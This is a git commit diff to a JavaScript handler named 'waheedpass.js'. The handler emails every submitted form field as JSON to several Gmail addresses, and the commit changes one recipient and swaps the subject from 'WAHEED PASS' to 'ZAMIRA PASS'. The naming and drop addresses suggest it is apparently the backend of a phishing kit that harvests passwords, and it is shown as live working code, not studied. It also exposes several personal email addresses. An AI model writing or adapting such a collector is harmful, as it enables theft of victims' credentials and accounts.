d2713011f48f0821e2d60558ad86fd224bc39c5a
svgdvahshn-gif <svgdvahshn@gmail.com>
2026-01-23 22:51:25 +0500

    Update waheedpass.js

--- waheedpass.js
+++ waheedpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,alinadavid22115@gmail.com",
-      subject: "WAHEED PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,facebookwork1245@gmail.com",
+      subject: "ZAMIRA PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
